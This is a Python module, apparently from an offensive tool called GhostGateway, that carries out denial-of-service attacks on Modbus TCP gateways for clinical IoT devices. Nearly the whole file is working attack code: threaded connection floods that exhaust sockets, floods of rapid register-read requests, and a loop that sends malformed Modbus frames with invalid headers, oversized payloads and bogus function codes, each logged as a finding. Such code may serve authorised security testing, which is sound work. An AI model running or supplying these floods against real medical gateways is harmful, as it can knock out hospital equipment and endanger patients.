"""
GhostGateway - Modbus DoS Module
Simulates Denial of Service on Modbus TCP clinical IoT gateways.
Connection flooding, malformed function codes, request exhaustion.
"""

import socket
import struct
import threading
import time
from utils.logger import get_logger

logger = get_logger("Modbus-DoS")


class ModbusDoS:
    def __init__(self, target, port=502, verbose=False):
        self.target = target
        self.port = port
        self.verbose = verbose
        self.findings = []
        self._stop_event = threading.Event()
        self._request_count = 0
        self._lock = threading.Lock()

    def _connection_flood_worker(self):
        """Open and hold TCP connections to exhaust the device"""
        sockets = []
        while not self._stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target, self.port))
                sockets.append(sock)
                with self._lock:
                    self._request_count += 1
            except Exception:
                break
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

    def _request_flood_worker(self):
        """Send rapid Modbus requests to overwhelm the gateway"""
        while not self._stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target, self.port))
                req = struct.pack(">HHHBBHH", 0x0001, 0x0000, 0x0006,
                                  0x01, 0x03, 0x0000, 0x007D)  # Read 125 registers
                sock.send(req)
                sock.close()
                with self._lock:
                    self._request_count += 1
            except Exception:
                pass

    def _malformed_frame_worker(self):
        """Send malformed Modbus frames to test exception handling"""
        malformed_frames = [
            bytes([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),       # Invalid header
            bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01]),  # Too short PDU
            bytes([0x00, 0x01, 0x00, 0x00, 0xFF, 0xFF] + [0xAA] * 50),  # Oversized
            bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x06,
                   0x01, 0x41, 0x00, 0x00, 0x00, 0x01]),        # Invalid FC 0x41
            bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x06,
                   0x01, 0x00, 0xFF, 0xFF, 0xFF, 0xFF]),         # FC 0x00
        ]
        i = 0
        while not self._stop_event.is_set():
            frame = malformed_frames[i % len(malformed_frames)]
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target, self.port))
                sock.send(frame)
                resp = sock.recv(256)
                sock.close()
                if self.verbose:
                    logger.info(f"  Malformed frame response: {resp.hex()}")
                with self._lock:
                    self._request_count += 1
            except Exception:
                pass
            i += 1

    def connection_flood(self, duration=10, threads=10):
        logger.info(f"[DoS] Connection Flood: {threads} threads for {duration}s")
        self._stop_event.clear()
        self._request_count = 0
        workers = [threading.Thread(target=self._connection_flood_worker)
                   for _ in range(threads)]
        for w in workers:
            w.daemon = True
            w.start()
        time.sleep(duration)
        self._stop_event.set()
        for w in workers:
            w.join(timeout=2)
        logger.info(f"  [+] Connection flood complete. ~{self._request_count} connections attempted.")
        self.findings.append({
            "check": "Connection Flood",
            "severity": "HIGH",
            "detail": f"~{self._request_count} connection attempts in {duration}s against {self.target}:{self.port}"
        })

    def request_flood(self, duration=10, threads=5):
        logger.info(f"[DoS] Request Flood: {threads} threads for {duration}s")
        self._stop_event.clear()
        self._request_count = 0
        workers = [threading.Thread(target=self._request_flood_worker)
                   for _ in range(threads)]
        for w in workers:
            w.daemon = True
            w.start()
        time.sleep(duration)
        self._stop_event.set()
        for w in workers:
            w.join(timeout=2)
        logger.info(f"  [+] Request flood complete. ~{self._request_count} requests sent.")
        self.findings.append({
            "check": "Request Flood",
            "severity": "HIGH",
            "detail": f"~{self._request_count} rapid requests in {duration}s against {self.target}:{self.port}"
        })

    def malformed_frame_attack(self, duration=5):
        logger.info(f"[DoS] Malformed Frame Attack for {duration}s")
        self._stop_event.clear()
        self._request_count = 0
        w = threading.Thread(target=self._malformed_frame_worker)
        w.daemon = True
        w.start()
        time.sleep(duration)
        self._stop_event.set()
        w.join(timeout=2)
        logger.info(f"  [+] Malformed frames complete. ~{self._request_count} sent.")
        self.findings.append({
            "check": "Malformed Frame Attack",
            "severity": "MEDIUM",
            "detail": f"~{self._request_count} malformed Modbus frames sent. Tests exception handling robustness."
        })

    def run(self, duration=10, threads=10):
        logger.info("=" * 50)
        logger.info("  MODBUS DoS MODULE - GhostGateway")
        logger.info("=" * 50)
        self.connection_flood(duration=duration // 3, threads=threads)
        self.request_flood(duration=duration // 3, threads=threads // 2)
        self.malformed_frame_attack(duration=duration // 3)
        logger.info(f"[DoS] Complete. {len(self.findings)} findings.")
        return self.findings
